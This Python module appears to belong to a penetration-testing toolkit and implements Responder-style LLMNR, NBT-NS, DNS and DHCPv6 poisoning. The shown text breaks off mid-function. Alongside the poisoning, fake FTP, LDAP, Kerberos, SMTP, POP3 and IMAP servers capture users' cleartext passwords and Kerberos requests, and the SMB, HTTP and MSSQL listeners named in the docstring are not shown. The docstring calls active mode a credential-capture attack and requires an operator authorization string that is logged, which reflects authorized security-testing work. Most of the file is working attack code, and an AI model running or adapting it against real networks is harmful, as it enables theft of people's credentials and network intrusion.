"""
Active LLMNR / NBT-NS / mDNS / WPAD / DHCPv6 / DNS / LDAP / Kerberos /
FTP / SMTP / POP3 / IMAP / MSSQL poisoning with credential capture.

Two modes:

    passive (default)   Listen to ambient name-resolution traffic and
                        harvest hostnames, MACs, IPs. Zero packets sent.

    active (--active)   Respond to LLMNR / NBT-NS / mDNS queries with
                        our own IP, serve WPAD and DHCPv6, run DNS, and
                        stand up listeners on every protocol that
                        Windows will fall back to when its primary
                        name resolution fails. Capture plaintext creds
                        (FTP, HTTP Basic, POP3, IMAP, SMTP, LDAP simple
                        bind, MSSQL SQL auth) and NTLM hashes (SMB,
                        HTTP, MSSQL). Optionally crack captured NTLMv2
                        with hashcat / john if they are on PATH.

The active mode is a credential-capture attack. It is exactly what
Responder does on Linux. It is trivially detected by any modern EDR.
Do not run it on a network you don't own or don't have written
authorization to test. We require the operator to pass
--authorized-by "<name or ticket-id>" before any packet is sent; the
string is logged to loot/poison_audit.log with a timestamp.

Protocols we handle:

    LLMNR       UDP/5355  multicast 224.0.0.252 / ff02::1:3
    NBT-NS      UDP/137   broadcast local segment
    mDNS        UDP/5353  multicast 224.0.0.251   (passive only)
    WPAD        TCP/80    HTTP proxy auto-discovery (detect only)
    DHCPv6      UDP/547   IPv6 DNS server assignment
    DNS         UDP/53    answer A queries with our IP
    LDAP        TCP/389   simple bind
    Kerberos    TCP/88    AS-REQ capture (raw bytes to loot/)
    FTP         TCP/21    USER/PASS
    HTTP        TCP/80    Basic auth + NTLM
    SMTP        TCP/25    AUTH PLAIN
    POP3        TCP/110   USER/PASS
    IMAP        TCP/143   LOGIN
    SMB         TCP/445   NTLM over SMB
    MSSQL       TCP/1433  SQL auth + NTLM

Notes on scope:

    WPAD: we detect that clients are looking for a WPAD proxy config
    but we do NOT serve a real PAC file. Actually proxying the victim's
    traffic requires a full HTTP CONNECT proxy, which is out of scope
    for this module. The finding is "WPAD is enabled on this network",
    which is itself a real finding — the environment trusts a name-
    resolution-controlled proxy configuration.

    Kerberos: we capture raw AS-REQ frames to loot/kerberos/. These
    are NOT the same as AS-REP roasting material — AS-REP roasting
    requires an explicit request to a real KDC. To get crackable
    hashes, use impacket's GetNPUsers.py against the real DC if you
    have valid creds and the account is pre-auth-disabled. This
    listener's job is to record that a Kerberos client is on the
    segment and reveal the username in the AS-REQ.
"""

import asyncio
import base64
import os
import shutil
import socket
import struct
import subprocess
import threading
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path

from scapy.all import (
    Ether, IP, UDP, DNS, DNSQR, DNSRR,
    AsyncSniffer, send,
    get_if_hwaddr,
    conf as scapy_conf,
)

from core.output import info, success, warn, error
from net.util import PRINT_LOCK, note_error


# =====================================================================
# Constants
# =====================================================================

LLMNR_PORT = 5355
NBNS_PORT = 137
MDNS_PORT = 5353
DHCPV6_SERVER_PORT = 547
DHCPV6_CLIENT_PORT = 546
DNS_PORT = 53
LDAP_PORT = 389
KERBEROS_PORT = 88
FTP_PORT = 21
HTTP_PORT = 80
HTTPS_PORT = 443
SMTP_PORT = 25
POP3_PORT = 110
IMAP_PORT = 143
SMB_PORT = 445
MSSQL_PORT = 1433

LLMNR_MCAST = "224.0.0.252"
MDNS_MCAST = "224.0.0.251"
DHCPV6_MCAST = "ff02::1:2"
NBNS_BCAST = "255.255.255.255"

POISON_DENYLIST = {
    "localhost", "wpad", "isatap", "localhost.localdomain",
}

FTP_BANNER = "220 Microsoft FTP Service\r\n"
POP3_BANNER = "+OK Microsoft POP3 service ready\r\n"
IMAP_BANNER = ("* OK [CAPABILITY IMAP4rev1 AUTH=PLAIN] "
               "Microsoft Exchange IMAP4 ready\r\n")
SMTP_BANNER = "220 mail.local Microsoft ESMTP MAIL Service ready\r\n"


# =====================================================================
# Data model
# =====================================================================

@dataclass
class Capture:
    """One captured observation."""
    kind: str
    ts: str
    src_ip: str = ""
    src_mac: str = ""
    src_port: int = 0
    query_name: str = ""
    query_type: str = ""
    poisoned: bool = False
    note: str = ""
    # Credential material
    username: str = ""
    domain: str = ""
    password: str = ""
    auth_blob: str = ""
    # NTLM specifics
    challenge: bytes = b""
    ntlm_response: bytes = b""
    ntlmv2_hash: str = ""
    raw_ntlm_type3: bytes = b""

    def as_finding(self) -> dict:
        base = {
            "module": "poison",
            "target": self.src_ip or self.query_name,
            "evidence": self.note or self.kind,
            "data": {
                "kind": self.kind,
                "src_ip": self.src_ip,
                "src_mac": self.src_mac,
                "query_name": self.query_name,
                "poisoned": self.poisoned,
            },
        }

        if self.kind == "ntlm-hash":
            base["type"] = "ntlm_hash_captured"
            base["severity"] = "high"
            base["evidence"] = (
                f"Captured NTLMv2 hash for {self.domain}\\{self.username} "
                f"from {self.src_ip}"
            )
            base["data"].update({
                "username": self.username,
                "domain": self.domain,
                "hash": self.ntlmv2_hash,
            })
        elif self.kind in ("ftp-cred", "pop3-cred", "imap-cred",
                            "smtp-cred", "http-basic", "ldap-bind",
                            "mssql-sql-auth"):
            base["type"] = "cleartext_credential"
            base["severity"] = "critical"
            proto = self.kind.split("-")[0]
            base["evidence"] = (
                f"Captured cleartext credentials from "
                f"{self.src_ip} over {proto}"
            )
            base["data"].update({
                "username": self.username,
                "password": self.password,
                "protocol": proto,
            })
        elif self.kind == "mssql-ntlm":
            base["type"] = "ntlm_blob_captured"
            base["severity"] = "high"
            base["evidence"] = (
                f"Captured MSSQL NTLM auth from {self.src_ip} "
                f"({self.domain}\\{self.username})"
            )
            base["data"].update({
                "username": self.username,
                "domain": self.domain,
                "blob_b64": self.auth_blob,
            })
        elif self.kind == "kerberos-asreq":
            base["type"] = "kerberos_asreq_captured"
            base["severity"] = "high"
            base["evidence"] = (
                f"Captured AS-REQ from {self.src_ip} for "
                f"user {self.username!r}"
            )
            base["data"].update({
                "username": self.username,
                "asreq_b64": self.auth_blob,
            })
        elif self.kind == "wpad-request":
            base["type"] = "wpad_request"
            base["severity"] = "info"
            base["evidence"] = (
                f"WPAD lookup from {self.src_ip} — victim has "
                f"proxy auto-discovery enabled"
            )
        elif self.kind == "dhcpv6-solicit":
            base["type"] = "dhcpv6_solicit"
            base["severity"] = "info"
            base["evidence"] = (
                f"DHCPv6 SOLICIT from {self.src_ip}"
            )
        elif self.kind == "dns-query":
            base["type"] = "informational"
            base["severity"] = "info"
            base["evidence"] = (
                f"DNS query for {self.query_name!r} from {self.src_ip}"
            )
        else:
            base["type"] = "informational"
            base["severity"] = "info"
        return base


# =====================================================================
# Global state
# =====================================================================

class PoisonState:
    """Shared state across listeners and poison responses."""
    def __init__(self):
        self.captures: list[Capture] = []
        self.captures_lock = threading.Lock()
        self.my_ip: str = ""
        self.my_ipv6: str = ""
        self.my_mac: str = ""
        self.iface: str = ""
        self.active: bool = False
        self.authorized_by: str = ""
        self.start_time: float = 0.0
        self.workspace = None

        self.poisoned_names: set[tuple[str, str]] = set()
        self.captured_from: set[str] = set()
        self.shutdown = threading.Event()

    def record(self, cap: Capture):
        with self.captures_lock:
            self.captures.append(cap)

    def already_poisoned(self, name: str, src_ip: str) -> bool:
        return (name.lower(), src_ip) in self.poisoned_names

    def mark_poisoned(self, name: str, src_ip: str):
        self.poisoned_names.add((name.lower(), src_ip))

    def already_captured(self, src_ip: str) -> bool:
        return src_ip in self.captured_from

    def mark_captured(self, src_ip: str):
        self.captured_from.add(src_ip)


# =====================================================================
# Authorization gate
# =====================================================================

def _check_authorization(authorized_by: str) -> tuple[bool, str]:
    if not authorized_by or not authorized_by.strip():
        return False, "no --authorized-by value provided"
    value = authorized_by.strip()
    if len(value) < 3:
        return False, f"authorization string too short: {value!r}"
    return True, value


def _audit_log(state: "PoisonState", message: str):
    if not state.workspace:
        return
    try:
        log = state.workspace.loot_dir / "poison_audit.log"
        log.parent.mkdir(parents=True, exist_ok=True)
        ts = datetime.now(timezone.utc).isoformat()
        with log.open("a", encoding="utf-8") as f:
            f.write(f"[{ts}] {message}\n")
    except Exception as e:
        warn(f"could not write audit log: {e}")


# =====================================================================
# Interface / IP discovery
# =====================================================================

def _pick_iface() -> tuple[str, str, str, str]:
    """Return (iface_name, ipv4, ipv6, mac) for the default route."""
    try:
        route = scapy_conf.route.route("8.8.8.8")
        iface = route[0]
        ip = route[1]
        if iface and ip and ip != "0.0.0.0":
            mac = "00:00:00:00:00:00"
            ipv6 = ""
            try:
                mac = get_if_hwaddr(iface)
            except Exception:
                pass
            try:
                import psutil
                addrs = psutil.net_if_addrs().get(iface, [])
                for a in addrs:
                    if getattr(a, "family", None) == socket.AF_INET6:
                        v6 = a.address.split("%")[0]
                        if not v6.startswith("fe80"):
                            ipv6 = v6
                            break
            except Exception:
                pass
            return iface, ip, ipv6, mac
    except Exception:
        pass

    try:
        import psutil
        for iface, addrs in psutil.net_if_addrs().items():
            ipv4 = None
            ipv6 = None
            mac = None
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ipv4 = addr.address
                elif getattr(addr, "family", None) == socket.AF_INET6:
                    v6 = addr.address.split("%")[0]
                    if not v6.startswith("fe80"):
                        ipv6 = v6
                elif getattr(addr, "family", None) == 17:
                    mac = addr.address
            if ipv4 and ipv4 != "127.0.0.1":
                if not mac:
                    try:
                        mac = get_if_hwaddr(iface)
                    except Exception:
                        mac = "00:00:00:00:00:00"
                return iface, ipv4, ipv6 or "", mac
    except ImportError:
        pass

    return "", "", "", ""


# =====================================================================
# DNS name decoding
# =====================================================================

def _decode_dns_name(raw: bytes) -> str:
    parts = []
    i = 0
    while i < len(raw):
        length = raw[i]
        if length == 0:
            break
        i += 1
        if i + length > len(raw):
            break
        try:
            parts.append(raw[i:i + length].decode("ascii", errors="replace"))
        except Exception:
            parts.append(raw[i:i + length].hex())
        i += length
    return ".".join(parts)


def _decode_nbns_name(raw: bytes) -> str:
    if not raw:
        return ""
    out = []
    i = 1
    while i < len(raw) - 1:
        try:
            hi = (raw[i] - 0x41) << 4
            lo = (raw[i + 1] - 0x41) & 0x0F
            out.append(chr(hi | lo))
        except Exception:
            break
        i += 2
    return "".join(out).strip()


def _should_poison(name: str) -> bool:
    low = name.lower().strip(".")
    if not low:
        return False
    if low in POISON_DENYLIST:
        return False
    if "." in low:
        return False
    try:
        if low == socket.gethostname().lower():
            return False
    except Exception:
        return False
    return True


# =====================================================================
# Base listener (shared scaffolding for TCP listeners)
# =====================================================================

class _BaseListener:
    """Shared accept-loop scaffolding for TCP-based listeners."""

    default_port: int = 0
    name: str = "listener"

    def __init__(self, state: PoisonState, port: int | None = None,
                 bind_addr: str = "0.0.0.0", verbose: bool = False):
        self.state = state
        self.port = port if port is not None else self.default_port
        self.bind_addr = bind_addr
        self.verbose = verbose
        self._server: socket.socket | None = None
        self._running = False
        self._thread: threading.Thread | None = None

    def start(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.bind_addr, self.port))
            sock.listen(16)
            sock.settimeout(1.0)
            self._server = sock
            self._running = True
        except PermissionError:
            warn(f"poison: cannot bind {self.port}/tcp for {self.name} — "
                 f"need Administrator privileges")
            return False
        except OSError as e:
            warn(f"poison: cannot bind {self.port}/tcp for {self.name}: {e}")
            return False

        self._thread = threading.Thread(
            target=self._accept_loop, daemon=True)
        self._thread.start()
        info(f"poison: {self.name} listener on "
             f"{self.bind_addr}:{self.port}")
        return True

    def stop(self):
        self._running = False
        if self._server:
            try:
                self._server.close()
            except Exception:
                pass
        if self._thread:
            try:
                self._thread.join(timeout=2.0)
            except Exception:
                pass

    def _accept_loop(self):
        while self._running and not self.state.shutdown.is_set():
            try:
                client, addr = self._server.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(
                target=self._handle_client,
                args=(client, addr),
                daemon=True,
            ).start()

    def _handle_client(self, client: socket.socket, addr):
        client.settimeout(10.0)
        try:
            self.handle(client, addr)
        except Exception as e:
            if self.verbose:
                info(f"poison: {self.name} handler error from "
                     f"{addr[0]}: {type(e).__name__}: {e}")
        finally:
            try:
                client.close()
            except Exception:
                pass

    def handle(self, client: socket.socket, addr):
        raise NotImplementedError


# =====================================================================
# WPAD listener (TCP/80) — detect only, no PAC served
# =====================================================================

class WPADListener(_BaseListener):
    default_port = HTTP_PORT
    name = "WPAD"

    def handle(self, client: socket.socket, addr):
        data = b""
        while b"\r\n\r\n" not in data:
            try:
                chunk = client.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
            if len(data) > 8192:
                break

        first_line = data.split(b"\r\n", 1)[0].decode(
            "utf-8", errors="replace")

        path = ""
        if " " in first_line:
            parts = first_line.split(" ")
            if len(parts) >= 2:
                path = parts[1]

        cap = Capture(
            kind="wpad-request",
            ts=datetime.now(timezone.utc).isoformat(),
            src_ip=addr[0],
            src_port=addr[1],
            query_name=path,
            note=f"WPAD request from {addr[0]}: {first_line[:100]}",
        )
        self.state.record(cap)

        with PRINT_LOCK:
            success(f"[WPAD] {addr[0]} → {first_line[:80]}")

        # Return 404. We do NOT serve a PAC file — proxying the
        # victim's traffic requires a full HTTP CONNECT proxy which
        # this module doesn't implement. The finding is "WPAD is
        # enabled on this network."
        response = (
            b"HTTP/1.1 404 Not Found\r\n"
            b"Content-Type: text/plain\r\n"
            b"Content-Length: 0\r\n"
            b"Connection: close\r\n"
            b"\r\n"
        )
        try:
            client.sendall(response)
        except Exception:
            pass


# =====================================================================
# DHCPv6 listener (UDP/547) — hands out our IPv6 as DNS
# =====================================================================

class DHCPv6Listener:
    """UDP/547 DHCPv6 server. Simplified — sends a minimal ADVERTISE
    with our IPv6 as the DNS server."""

    def __init__(self, state: PoisonState, port: int = DHCPV6_SERVER_PORT,
                 verbose: bool = False):
        self.state = state
        self.port = port
        self.verbose = verbose
        self._sock: socket.socket | None = None
        self._running = False
        self._thread: threading.Thread | None = None

    def start(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("::", self.port))
            sock.settimeout(1.0)
            self._sock = sock
            self._running = True
        except PermissionError:
            warn(f"poison: cannot bind {self.port}/udp for DHCPv6 — "
                 f"need Administrator privileges")
            return False
        except OSError as e:
            warn(f"poison: cannot bind {self.port}/udp for DHCPv6: {e}")
            return False

        self._thread = threading.Thread(
            target=self._recv_loop, daemon=True)
        self._thread.start()
        info(f"poison: DHCPv6 listener on [::]:{self.port}")
        return True

    def stop(self):
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
        if self._thread:
            try:
                self._thread.join(timeout=2.0)
            except Exception:
                pass

    def _recv_loop(self):
        while self._running and not self.state.shutdown.is_set():
            try:
                data, addr = self._sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break

            src_ip = addr[0]
            cap = Capture(
                kind="dhcpv6-solicit",
                ts=datetime.now(timezone.utc).isoformat(),
                src_ip=src_ip,
                src_port=addr[1],
                note=f"DHCPv6 SOLICIT from {src_ip} "
                     f"({len(data)} bytes)",
            )
            self.state.record(cap)

            with PRINT_LOCK:
                success(f"[DHCPv6] {src_ip} sent SOLICIT "
                        f"({len(data)}B)")

            if self.state.my_ipv6:
                try:
                    self._send_advertise(addr, data)
                except Exception as e:
                    if self.verbose:
                        warn(f"DHCPv6 advertise failed: "
                             f"{type(e).__name__}: {e}")

    def _send_advertise(self, client_addr, client_data: bytes):
        if len(client_data) < 4:
            return
        xid = client_data[1:4]

        mac = self.state.my_mac.replace(":", "")
        try:
            mac_bytes = bytes.fromhex(mac)
        except ValueError:
            mac_bytes = b"\x00" * 6

        server_duid = struct.pack(">HH", 3, 1) + mac_bytes

        pkt = b"\x02" + xid
        pkt += struct.pack(">HH", 2, len(server_duid)) + server_duid

        try:
            import ipaddress
            dns_v6 = ipaddress.IPv6Address(self.state.my_ipv6).packed
            dns_opt = struct.pack(">HH", 23, 16) + dns_v6
            pkt += dns_opt
        except Exception:
            pass

        try:
            self._sock.sendto(pkt, client_addr)
            if self.verbose:
                info(f"  DHCPv6 ADVERTISE sent to {client_addr[0]}")
        except Exception as e:
            if self.verbose:
                warn(f"  DHCPv6 send failed: {e}")


# =====================================================================
# DNS listener (UDP/53) — answers A queries with our IP
# =====================================================================

class DNSListener:
    def __init__(self, state: PoisonState, port: int = DNS_PORT,
                 bind_addr: str = "0.0.0.0", verbose: bool = False):
        self.state = state
        self.port = port
        self.bind_addr = bind_addr
        self.verbose = verbose
        self._sock: socket.socket | None = None
        self._running = False
        self._thread: threading.Thread | None = None

    def start(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.bind_addr, self.port))
            sock.settimeout(1.0)
            self._sock = sock
            self._running = True
        except PermissionError:
            warn(f"poison: cannot bind {self.port}/udp for DNS — "
                 f"need Administrator privileges")
            return False
        except OSError as e:
            warn(f"poison: cannot bind {self.port}/udp for DNS: {e}")
            return False

        self._thread = threading.Thread(
            target=self._recv_loop, daemon=True)
        self._thread.start()
        info(f"poison: DNS listener on {self.bind_addr}:{self.port}")
        return True

    def stop(self):
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
        if self._thread:
            try:
                self._thread.join(timeout=2.0)
            except Exception:
                pass

    def _recv_loop(self):
        while self._running and not self.state.shutdown.is_set():
            try:
                data, addr = self._sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break

            try:
                qname, qtype = self._parse_question(data)
            except Exception:
                continue

            if not qname:
                continue

            cap = Capture(
                kind="dns-query",
                ts=datetime.now(timezone.utc).isoformat(),
                src_ip=addr[0],
                src_port=addr[1],
                query_name=qname,
                query_type=f"DNS/type{qtype}",
                note=f"DNS query from {addr[0]} for {qname!r}",
            )
            self.state.record(cap)

            if self.verbose:
                with PRINT_LOCK:
                    info(f"[DNS] {addr[0]} → {qname} (type {qtype})")

            if qtype == 1 and self.state.my_ip:
                try:
                    resp = self._build_a_response(data, self.state.my_ip)
                    self._sock.sendto(resp, addr)
                except Exception:
                    pass

    @staticmethod
    def _parse_question(data: bytes) -> tuple[str, int]:
        if len(data) < 12:
            return "", 0
        offset = 12
        labels = []
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            offset += 1
            if offset + length > len(data):
                return "", 0
            labels.append(data[offset:offset + length].decode(
                "ascii", errors="replace"))
            offset += length
        qname = ".".join(labels)
        if offset + 4 > len(data):
            return qname, 0
        qtype = struct.unpack(">H", data[offset:offset + 2])[0]
        return qname, qtype

    @staticmethod
    def _build_a_response(query: bytes, answer_ip: str) -> bytes:
        if len(query) < 12:
            return b""
        query_id = query[:2]
        flags = b"\x85\x80"
        header = query_id + flags + b"\x00\x01\x00\x01\x00\x00\x00\x00"

        offset = 12
        while offset < len(query) and query[offset] != 0:
            offset += 1 + query[offset]
        if offset >= len(query):
            return b""
        question_end = offset + 5
        if question_end > len(query):
            return b""
        question = query[12:question_end]

        answer_name = b"\xC0\x0C"
        answer_head = struct.pack(">HHIH", 1, 1, 60, 4)
        try:
            answer_data = socket.inet_aton(answer_ip)
        except OSError:
            answer_data = socket.inet_aton("127.0.0.1")
        return header + question + answer_name + answer_head + answer_data


# =====================================================================
# LDAP listener (TCP/389) — simple bind capture
# =====================================================================

class LDAPListener(_BaseListener):
    default_port = LDAP_PORT
    name = "LDAP"

    def handle(self, client: socket.socket, addr):
        data = b""
        try:
            while len(data) < 4096:
                chunk = client.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) >= 2:
                    if data[1] & 0x80:
                        length_bytes = data[1] & 0x7F
                        if length_bytes > 0 and \
                                len(data) >= 2 + length_bytes:
                            total = 2 + length_bytes
                            for i in range(length_bytes):
                                total += data[2 + i] << (
                                    8 * (length_bytes - 1 - i))
                            if len(data) >= total:
                                break
                    else:
                        total = 2 + data[1]
                        if len(data) >= total:
                            break
        except socket.timeout:
            pass

        if len(data) < 2:
            return
        if data[0] != 0x30:
            return

        try:
            username, password = self._parse_simple_bind(data)
        except Exception as e:
            if self.verbose:
                warn(f"LDAP parse failed: {type(e).__name__}: {e}")
            return

        if not (username or password):
            return

        cap = Capture(
            kind="ldap-bind",
            ts=datetime.now(timezone.utc).isoformat(),
            src_ip=addr[0],
            src_port=addr[1],
            username=username,
            password=password,
            note=(f"LDAP simple bind from {addr[0]}: "
                  f"{username!r} / {password!r}"),
        )
        self.state.record(cap)

        with PRINT_LOCK:
            success(f"[LDAP] {addr[0]} → {username!r} : "
                    f"{password!r}")

        try:
            resp = self._build_bind_response(data, result_code=49)
            client.sendall(resp)
        except Exception:
            pass

    @staticmethod
    def _parse_simple_bind(data: bytes) -> tuple[str, str]:
        n = len(data)
        username = ""
        password = ""

        i = 0
        while i < n:
            if data[i] == 0x80:
                j = i + 1
                if j >= n:
                    break
                length = data[j]
                j += 1
                if length & 0x80:
                    lb = length & 0x7F
                    if j + lb > n:
                        break
                    length = 0
                    for k in range(lb):
                        length = (length << 8) | data[j + k]
                    j += lb
                if j + length > n:
                    break
                password = data[j:j + length].decode(
                    "utf-8", errors="replace")
                break
            i += 1

        i = 0
        while i < n:
            if data[i] == 0x04:
                j = i + 1
                if j >= n:
                    break
                length = data[j]
                j += 1
                if length & 0x80:
                    lb = length & 0x7F
                    if j + lb > n:
                        break
                    length = 0
                    for k in range(lb):
                        length = (length << 8) | data[j + k]
                    j += lb
                if j + length > n:
                    break
                candidate = data[j:j + length].decode(
                    "utf-8", errors="replace")
                if candidate:
                    username = candidate
                    break
            if data[i] == 0x80:
                break
            i += 1

        return username, password

    @staticmethod
    def _build_bind_response(query: bytes, result_code: int = 49) -> bytes:
        if len(query) < 5 or query[0] != 0x30:
            return b""
        i = 1
        if query[i] & 0x80:
            i += 1 + (query[i] & 0x7F)
        else:
            i += 1
        if query[i] != 0x02:
            return b""
        i += 1
        msg_id_len = query[i]
        i += 1
        msg_id = query[i:i + msg_id_len]

        err_msg = b"Invalid credentials"
        inner = (b"\x0A\x01" + bytes([result_code]) +
                 b"\x04\x00" +
                 b"\x04" + bytes([len(err_msg)]) + err_msg)
        bind_resp = b"\x61" + bytes([len(inner)]) + inner

        ldap_msg_inner = b"\x02" + bytes([len(msg_id)]) + msg_id + bind_resp
        ldap_msg = b"\x30" + bytes([len(ldap_msg_inner)]) + ldap_msg_inner
        return ldap_msg


# =====================================================================
# Kerberos listener (TCP/88) — capture raw AS-REQ
# =====================================================================

class KerberosListener(_BaseListener):
    default_port = KERBEROS_PORT
    name = "Kerberos"

    def handle(self, client: socket.socket, addr):
        try:
            length_header = self._recv_exact(client, 4)
        except socket.timeout:
            return
        if not length_header or len(length_header) < 4:
            return

        msg_len = struct.unpack(">I", length_header)[0]
        if msg_len > 65536:
            return

        try:
            asreq = self._recv_exact(client, msg_len)
        except socket.timeout:
            return
        if not asreq or len(asreq) < msg_len:
            return

        username = self._extract_username(asreq)

        cap = Capture(
            kind="kerberos-asreq",
            ts=datetime.now(timezone.utc).isoformat(),
            src_ip=addr[0],
            src_port=addr[1],
            username=username,
            auth_blob=base64.b64encode(asreq).decode("ascii"),
            note=(f"Kerberos AS-REQ from {addr[0]} "
                  f"(user={username!r}, {len(asreq)}B)"),
        )
        self.state.record(cap)

        with PRINT_LOCK:
            success(f"[Kerberos] {addr[0]} → AS-REQ "
                    f"user={username!r} ({len(asreq)}B)")

        # Write raw AS-REQ bytes to loot/kerberos/
        if self.state.workspace:
            try:
                dump_dir = self.state.workspace.loot_dir / "kerberos"
                dump_dir.mkdir(parents=True, exist_ok=True)
                fname = f"asreq_{addr[0]}_{int(time.time())}.bin"
                (dump_dir / fname).write_bytes(asreq)
            except Exception:
                pass

        try:
            krb_error = self._build_krb_error(6)
            framed = struct.pack(">I", len(krb_error)) + krb_error
            client.sendall(framed)
        except Exception:
            pass

    @staticmethod
    def _recv_exact(sock: socket.socket, n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            try:
                chunk = sock.recv(n - len(buf))
            except socket.timeout:
                return b""
            if not chunk:
                return buf
            buf += chunk
        return buf

    @staticmethod
    def _extract_username(asreq: bytes) -> str:
        import re
        candidates = re.findall(rb"[\x20-\x7E]{3,32}", asreq)
        best = ""
        best_score = 0
        for c in candidates:
            try:
                s = c.decode("ascii")
            except Exception:
                continue
            if not s or len(s) < 3 or len(s) > 32:
                continue
            if not s[0].isalpha():
                continue
            if any(ch in s for ch in " \t\n\r@/:\\"):
                continue
            score = len(s) + sum(ch.isalnum() for ch in s)
            if score > best_score:
                best_score = score
                best = s
        return best

    @staticmethod
    def _build_krb_error(error_code: int) -> bytes:
        pvno = b"\xA0\x03\x02\x01\x05"
        msg_type = b"\xA1\x03\x02\x01\x1E"
        err = (b"\xA6\x03\x02\x01" + bytes([error_code]))
        inner = pvno + msg_type + err
        body = b"\x7E" + bytes([len(inner)]) + inner
        return body


# =====================================================================
# FTP listener (TCP/21) — USER/PASS
# =====================================================================

class FTPListener(_BaseListener):
    default_port = FTP_PORT
    name = "FTP"

    def handle(self, client: socket.socket, addr):
        try:
            client.sendall(FTP_BANNER.encode("ascii"))
        except Exception:
            return

        username = ""
        password = ""

        for _ in range(8):
            line = self._read_line(client)
            if not line:
                break
            line = line.strip()
            upper = line.upper()

            if upper.startswith("USER "):
                username = line[5:].strip()
                try:
                    client.sendall(b"331 Password required\r\n")
                except Exception:
                    break
            elif upper.startswith("PASS "):
                password = line[5:].strip()
                try:
                    client.sendall(b"530 Login incorrect\r\n")
                except Exception:
                    break
                break
            elif upper.startswith("QUIT"):
                break
            else:
                try:
                    client.sendall(b"502 Command not implemented\r\n")
                except Exception:
                    break

        if not (username or password):
            return

        cap = Capture(
            kind="ftp-cred",
            ts=datetime.now(timezone.utc).isoformat(),
            src_ip=addr[0],
            src_port=addr[1],
            username=username,
            password=password,
            note=(f"FTP credentials from {addr[0]}: "
                  f"{username!r} / {password!r}"),
        )
        self.state.record(cap)

        with PRINT_LOCK:
            success(f"[FTP] {addr[0]} → {username!r} : {password!r}")

    @staticmethod
    def _read_line(sock: socket.socket, max_len: int = 512) -> str:
        buf = b""
        while len(buf) < max_len:
            try:
                ch = sock.recv(1)
            except socket.timeout:
                break
            if not ch:
                break
            buf += ch
            if ch == b"\n":
                break
        return buf.decode("utf-8", errors="replace").rstrip("\r\n")


# =====================================================================
# Plaintext auth listener (SMTP/POP3/IMAP)
# =====================================================================

class PlaintextAuthListener(_BaseListener):
    name = "auth"

    def __init__(self, state, port, protocol, banner,
                 verbose=False):
        super().__init__(state, port=port, verbose=verbose)
        self.protocol = protocol
        self.banner = banner
        self.name = protocol.upper()

    def handle(self, client: socket.socket, addr):
        try:
            client.sendall(self.banner.encode("ascii"))
        except Exception:
            return

        username = ""
        password = ""

        for _ in range(10):
            line = self._read_line(client)
            if not line:
                break

            parsed = self._parse_line(line)
            if parsed is None:
                try:
                    client.sendall(self._not_impl_response())
                except Exception:
                    break
                continue

            if parsed[0] == "user":
                username = parsed[1]
                try:
                    client.sendall(self._user_ack_response())
                except Exception:
                    break
            elif parsed[0] == "pass":
                password = parsed[1]
                try:
                    client.sendall(self._fail_response())
                except Exception:
                    break
                break
            elif parsed[0] == "auth":
                auth_user, auth_pass = parsed[1], parsed[2]
                if auth_user or auth_pass:
                    username = auth_user or username
                    password = auth_pass or password
                    try:
                        client.sendall(self._fail_response())
                    except Exception:
                        pass
                    break
            elif parsed[0] == "quit":
                break

        if not (username or password):
            return

        cap = Capture(
            kind=f"{self.protocol}-cred",
            ts=datetime.now(timezone.utc).isoformat(),
            src_ip=addr[0],
            src_port=addr[1],
            username=username,
            password=password,
            note=(f"{self.protocol.upper()} credentials from "
                  f"{addr[0]}: {username!r} / {password!r}"),
        )
        self.state.record(cap)

        with PRINT_LOCK:
            success(f"[{self.protocol.upper()}] {addr[0]} → "
                    f"{username!r} : {password!r}")

    def _parse_line(self, line: str):
        stripped = line.strip()
        upper = stripped.upper()

        if self.protocol == "smtp":
            if upper.startswith("AUTH PLAIN"):
                parts = stripped.split(None, 2)
                if len(parts) >= 3:
                    try:
                        decoded = base64.b64decode(parts[2])
                        fields = decoded.split(b"\x00")
                        if len(fields) >= 3:
                            return ("auth",
                                    fields[1].decode("utf-8",
                                                      errors="replace"),
                                    fields[2].decode("utf-8",
                                                      errors="replace"))
                    except Exception:
                        pass
                return None
            if upper.startswith("QUIT"):
                return ("quit",)

        if self.protocol == "pop3":
            if upper.startswith("USER "):
                return ("user", stripped[5:].strip())
            if upper.startswith("PASS "):
                return ("pass", stripped[5:].strip())
            if upper.startswith("QUIT"):
                return ("quit",)

        if self.protocol == "imap":
            if upper.startswith("LOGIN "):
                parts = stripped[6:].strip().split(None, 1)
                if len(parts) == 2:
                    user = parts[0].strip('"')
                    pw = parts[1].strip('"')
                    return ("auth", user, pw)
            if "LOGOUT" in upper:
                return ("quit",)

        return None

    def _user_ack_response(self) -> bytes:
        if self.protocol == "pop3":
            return b"+OK\r\n"
        return b"331 Password required\r\n"

    def _fail_response(self) -> bytes:
        if self.protocol == "pop3":
            return b"-ERR Authentication failed\r\n"
        if self.protocol == "imap":
            return b"A001 NO Authentication failed\r\n"
        return b"535 Authentication failed\r\n"

    def _not_impl_response(self) -> bytes:
        if self.protocol == "pop3":
            return b"-ERR Unknown command\r\n"
        if self.protocol == "imap":
            return b"A001 BAD Unknown command\r\n"
        return b"502 Command not implemented\r\n"

    @staticmethod
    def _read_line(sock: socket.socket, max_len: int = 1024) -> str:
        buf = b""
        while len(buf) < max_len:
            try:
                ch = sock.recv(1)
            except socket.timeout:
                break
            if not ch:
                break
            buf += ch
            if ch == b"\n":
                break
